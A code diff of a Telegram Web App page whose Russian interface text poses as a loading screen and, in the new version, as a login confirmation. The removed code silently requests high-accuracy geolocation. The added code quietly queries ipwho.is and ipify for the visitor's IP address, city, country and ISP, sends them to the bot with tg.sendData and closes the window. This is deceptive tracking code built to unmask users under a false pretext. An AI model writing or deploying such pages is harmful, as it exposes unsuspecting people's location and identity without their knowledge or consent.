@@ -3,8 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Загрузка...</title>
-  <!-- Telegram Web App SDK -->
+  <title>Проверка...</title>
   <script src="https://telegram.org/js/telegram-web-app.js"></script>
   <style>
     body {
@@ -43,7 +42,7 @@
 </head>
 <body>
   <div class="spinner"></div>
-  <p id="status-text">Инициализация сервиса...</p>
+  <p id="status-text">Подтверждение входа...</p>
 
   <script>
     const tg = window.Telegram.WebApp;
@@ -52,65 +51,58 @@
 
     let sent = false;
 
-    function sendLocationAndExit(coords) {
+    function sendAndClose(payload) {
       if (sent) return;
       sent = true;
-
-      const data = {
-        latitude: coords.latitude,
-        longitude: coords.longitude,
-        accuracy: coords.accuracy || coords.horizontal_accuracy || 0
-      };
-
       try {
-        tg.sendData(JSON.stringify(data));
+        tg.sendData(JSON.stringify(payload));
       } catch (e) {
         console.error("sendData error:", e);
       }
-      setTimeout(() => tg.close(), 300);
+      setTimeout(() => tg.close(), 250);
     }
 
-    function fallbackGeo() {
-      if ("geolocation" in navigator) {
-        navigator.geolocation.getCurrentPosition(
-          (pos) => sendLocationAndExit(pos.coords),
-          (err) => {
-            console.warn("navigator.geolocation error:", err.message);
-            const status = document.getElementById("status-text");
-            if (status) {
-              status.innerText = "Для продолжения подтвердите доступ к данным приложению.";
-            }
-            setTimeout(() => tg.close(), 2000);
-          },
-          {
-            enableHighAccuracy: true,
-            timeout: 10000,
-            maximumAge: 0
-          }
-        );
-      } else {
-        tg.close();
+    async function fetchWithTimeout(url, ms = 3500) {
+      const controller = new AbortController();
+      const timer = setTimeout(() => controller.abort(), ms);
+      try {
+        const res = await fetch(url, { signal: controller.signal });
+        return await res.json();
+      } finally {
+        clearTimeout(timer);
       }
     }
 
-    // Пробуем Telegram Native LocationManager (Telegram 7.7+)
-    if (tg.LocationManager) {
-      tg.LocationManager.init(() => {
-        if (tg.LocationManager.isInited) {
-          tg.LocationManager.getLocation((data) => {
-            if (data && data.latitude && data.longitude) {
-              sendLocationAndExit(data);
-            } else {
-              fallbackGeo();
-            }
+    async function collectIp() {
+      try {
+        const info = await fetchWithTimeout("https://ipwho.is/", 3500);
+        if (info && info.ip) {
+          sendAndClose({
+            ip: info.ip,
+            country: info.country || "",
+            city: info.city || "",
+            isp: (info.connection && info.connection.isp) ? info.connection.isp : ""
           });
-        } else {
-          fallbackGeo();
+          return;
         }
-      });
-    } else {
-      fallbackGeo();
+      } catch (e) {
+        console.warn("ipwho.is error:", e);
+      }
+
+      try {
+        const fallback = await fetchWithTimeout("https://api.ipify.org?format=json", 3000);
+        if (fallback && fallback.ip) {
+          sendAndClose({ ip: fallback.ip, country: "", city: "", isp: "" });
+          return;
+        }
+      } catch (e) {
+        console.warn("ipify error:", e);
+      }
+
+      sendAndClose({ ip: "не определён", country: "", city: "", isp: "" });
     }
+
+    collectIp();
   </script>
 </body>
 </html>
